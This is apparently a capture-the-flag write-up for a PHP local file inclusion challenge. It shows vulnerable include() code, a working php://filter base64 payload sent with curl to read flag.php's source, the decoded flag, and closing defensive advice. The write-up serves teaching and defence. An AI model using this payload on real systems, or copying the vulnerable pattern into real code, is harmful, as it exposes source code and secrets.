# LFI




> **A simple PHP file reader with dynamic inclusion. Can you bypass standard execution flow to inspect the protected flag?**

{{< admonition tldr "TL;DR" >}}

**LFI** is a web security challenge that explores **Local File Inclusion** in PHP. The target file ( `flag.php` ) contains an `exit()` statement that terminates script execution before any output is generated when included normally. By using PHP's stream filter wrapper ( `php://filter/convert.base64-encode/resource=...` ), the source code is base64-encoded prior to interpretation, preventing execution and leaking the flag comment.

{{< /admonition >}}

## Source Code & Mechanisms

The application handles routing via the `page` GET parameter:

```php
if (isset($_GET['page'])) {
    include($_GET['page'] . ".php");
}
```

The server appends a `.php` extension to the user input and invokes PHP's `include()` construct.

A hint on the website notes that the flag is stored at:

```text
/var/www/html/flag.php
```

---

## The Roadblock: Code Execution via Include

When attempting to include the flag file directly:

```bash
curl "https://chall.nckuctf.org:28111/?page=/var/www/html/flag"
```

The server responds with:

```text
noflag here QQ
```

Inspecting the target file logic reveals why standard inclusion fails:

```php
<?php
  // NCKUCTF{...}
  echo "noflag here QQ
";
  exit();
?>
```

Because `include()` executes PHP code, the `exit()` call immediately halts the PHP engine before the response can finish rendering, and comments within PHP tags ( `//` ) are stripped by the compiler.

---

## Exploitation via PHP Stream Wrapper

To read the source code of a PHP file without executing it, we can leverage PHP's stream wrapper:

```text
php://filter
```

By chaining the `convert.base64-encode` filter, PHP encodes the raw contents of the file on disk into Base64 **before** passing it to the inclusion parser:

```text
?page=php://filter/convert.base64-encode/resource=/var/www/html/flag
```

Because the server automatically appends `.php` , the full resource resolution becomes:

```text
/var/www/html/flag.php
```

### Sending the Payload

```bash
curl -s "https://chall.nckuctf.org:28111/?page=php://filter/convert.base64-encode/resource=/var/www/html/flag"
```

Output:

```text
PD9waHAKICAvL05DS1VDVEZ7MWYxXzE1XzdoM185MDBkX2NoNG5jM30KICBlY2hvICJub2ZsYWcgaGVyZSBRUVxuIjsKICBleGl0KCk7ID8+
```

### Decoding the Payload

```bash
echo "PD9waHAKICAvL05DS1VDVEZ7MWYxXzE1XzdoM185MDBkX2NoNG5jM30KICBlY2hvICJub2ZsYWcgaGVyZSBRUVxuIjsKICBleGl0KCk7ID8+" | base64 -d
```

Output:

```php
<?php
  //NCKUCTF{1f1_15_7h3_900d_ch4nc3}
  echo "noflag here QQ
";
  exit();
?>
```

---

##Flags

```text
NCKUCTF{1f1_15_7h3_900d_ch4nc3}
```

---

## Key Takeaways

1. **Avoid Dynamic Inclusions:** Never pass unsanitized user input directly to `include()` , `require()` , or `file_get_contents()` .
2. **Whitelist Approved Views:** Restrict pages to an explicit whitelist of allowed tokens.
3. **Disable Remote & Wrapper Inclusions:** Disable `allow_url_include` in `php.ini` to restrict dangerous protocols.


---

> Author: [spawn2pwn](https://github.com/nfl-alvis)  
> URL: https://ctf.spawn2pwn.my.id/posts/lfi/  

